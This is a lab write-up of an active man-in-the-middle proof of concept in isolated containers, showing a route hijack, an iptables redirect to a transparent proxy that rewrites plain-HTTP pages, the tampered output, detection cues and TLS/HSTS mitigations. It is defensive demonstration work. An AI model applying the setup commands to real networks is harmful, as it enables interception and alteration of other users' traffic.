# Threat 4 (MitM) — ACTIVE modification PoC (integrity break)

Upgrade of the read-only capture: the on-path interceptor now **alters** the traffic, not
just reads it. Same hijacked-route topology; the interceptor runs a pure-stdlib transparent
proxy (`active_mitm.py`) — `mitmproxy` is unpackaged on Debian trixie, so no external tool is
needed. Date 2026-11-25.

## Setup
```bash
bash threats/04-mitm/network.sh                                         # topology
incus exec mitm-interceptor -- bash /root/04-mitm/interceptor_setup.sh active
incus exec mitm-client -- ip route replace default via 10.66.0.2
```
`interceptor_setup.sh active` adds `iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80
-j REDIRECT --to-ports 8080` and starts the proxy. The proxy recovers the real destination
with `SO_ORIGINAL_DST` (so it is not tied to one target), relays the request, and rewrites
the HTML response.

## Result — the client receives a TAMPERED page
Interceptor (attacker) side:
```
[mitm] active transparent proxy on 0.0.0.0:8080
[mitm] 10.255.255.241:80  TAMPERED (10834 B)
```
What the **client** actually received (`curl http://10.255.255.241/` through the route):
```
<title>Apache2 Ubuntu Default Page: It works (TAMPERED)</title>
...
<div style="background:#c00;color:#fff;...">⚠ THIS PAGE WAS MODIFIED IN TRANSIT BY AN ON-PATH ATTACKER</div>
...
      It works (TAMPERED)!
```
The injected banner and the rewritten headline were never served by Apache — they were
inserted on-path. This proves **integrity loss** (the attacker can alter content), beyond the
confidentiality loss shown by the packet capture. Content-Length is rewritten so the client
renders the altered page transparently.

## Detection & mitigation (unchanged, now more strongly motivated)
- Detection: extra hop (`traceroute` → 10.66.0.2) and `ttl=63` — the inserted node is visible
  regardless of read-vs-alter.
- Mitigation: **TLS** makes the body ciphertext the proxy cannot rewrite; **cert pinning /
  HSTS** makes an active attacker's substitute certificate fail, so the altered channel is
  refused. Routing hardening (`accept_redirects=0`, authenticated routes) stops the hijack.

## Teardown
```bash
incus exec mitm-interceptor -- bash -c 'iptables -t nat -D PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-ports 8080; pkill -f active_mitm.py'
incus stop mitm-client mitm-interceptor
```
